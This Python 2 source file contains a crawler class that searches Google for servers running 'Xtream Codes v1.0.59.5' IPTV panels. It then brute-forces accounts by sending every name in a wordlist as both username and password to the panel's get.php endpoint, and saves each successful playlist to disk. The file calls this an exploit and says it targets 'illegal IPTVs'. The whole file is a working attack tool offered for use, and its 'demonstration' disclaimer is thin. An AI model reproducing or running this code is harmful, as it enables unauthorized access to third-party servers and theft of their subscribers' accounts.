import urllib2
import google
import time
import pyprind
import os
import random
from urlparse import urlparse

"""Crawler
Class that handles the crawling process that fetch accounts on illegal IPTVs

Authors:
Claudio Ludovico (@Ludo237)
Pinperepette (@Pinperepette)
Arm4x (@Arm4x)
"""
class Crawler(object):
    # version
    version = "1.2.3"
    # output default directory
    outputDir = "output"
    # language default directory
    languageDir = "languages"
    # string used to exploit the CMS
    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
    # string used to search the CMS
    searchString = "Xtream Codes v1.0.59.5"

    def __init__(self, language = "it"):
        """Default constructor

        Keyword arguments:
        language -- Language parameter allows us to understand what kind of
                    names file we need to use. (default it)
        """
        self.language = language.lower()
        self.parsedUrls = []
        self.foundedAccounts = 0

    def change_language(self, language = "it"):
        """Set the language you want to use to brute force names

        Keyword arguments:
        language -- Language parameter allows us to understand what kind of
                    names file we need to use. (default it)

        Return:
        boolean -- true if the language file exists, otherwise false
        """
        if os.path.isfile(self.languageDir + "/" + language + ".txt"):
            self.language = language
            return True
        else:
            return False

    def search_links(self):
        """Print the first 30 links from a Web search

        We set the limit of 30 links because this script serve as demonstration and it's
        not intended to be use for personal purpose.
        """
        for url in google.search(self.searchString, num=30, stop=1):
            parsed = urlparse(url)
            self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)

    def search_accounts(self, url = None):
        """Search Accounts
        This is the core method. It will crawl the give url for any possible accounts
        If we found any we will create a new directory under /output with the name
        of the site plus every account as five .m3u. Please use VLC for opening that
        kind of files

        Keyword arguments:
        url -- an url from the fetched list. (default None)

        Return:
        string -- the status of the crawling session
        """
        if not self.parsedUrls:
            return "You must fetch some URLs first"
        try:
            if not url:
                url = random.choice(self.parsedUrls)
            fileName = self.languageDir + "/" + self.language + ".txt"
            fileLength = self.file_length(fileName)
            progressBar = pyprind.ProgBar(fileLength, title = "Fetching account from " + url + " this might take a while.", stream = 1, monitor = True)
            foundedAccounts = 0
            with open(fileName) as f:
                rows = f.readlines()
            for row in rows:
                # Do the injection to the current url using the exploit that we know
                opener = urllib2.build_opener()
                opener.addheaders = [('User-agent', 'Mozilla/5.0')]
                response = opener.open(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
                fetched = response.read()
                # Update the progress bar in order to give to the user a nice
                # way to indicate the time left
                fileLength = fileLength - 1
                progressBar.update()
                # IF the fetched content is not empty
                # we build the dedicated .m3u file
                if len(fetched) > 0:
                    newPath = self.outputDir + "/" + url.replace("http://", "")
                    self.create_file(row, newPath, fetched)
            # Remove the current used url in order to avoid to parse it again
            self.parsedUrls.remove(url)
            if self.foundedAccounts != 0:
                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
            else:
                return "No results for " + url
        except IOError:
            return "Cannot open the current Language file. Try another one"
        except urllib2.HTTPError, e:
            return "Ops, HTTPError exception here. Cannot fetch the current URL " + str(e.code)
        except urllib2.URLError, e:
            return "Ops, the URL seems broken." + str(e.reason)
        except Exception:
            return "Ops something went wrong!"

    def create_file(self, row, newPath, fetched):
        """Create File
        Once the parse founds something worth it, we need to create the .m3u file
        to do so we except a newPath and the current row used from names file and also
        the content from the fetched response

        Keyword arguments:
        row -- row of the language file, this allow us to understand which names
        were useful for the brute force.

        newPath -- The path that we use to store the current fetched accounts.

        fetched -- the current response file from the attack.
        """
        if os.path.exists(newPath) is False:
            os.makedirs(newPath)
        outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
        outputFile.write(fetched)
        self.foundedAccounts = self.foundedAccounts + 1
        outputFile.close()

    def file_length(self, fileName):
        """File Length
        Cheapest way to calculate the rows of a file

        Keyword arguments:
        fileName -- string the filename into which we will check its Length
        """
        with open(fileName) as f:
            for i, l in enumerate(f):
                pass
        return i + 1
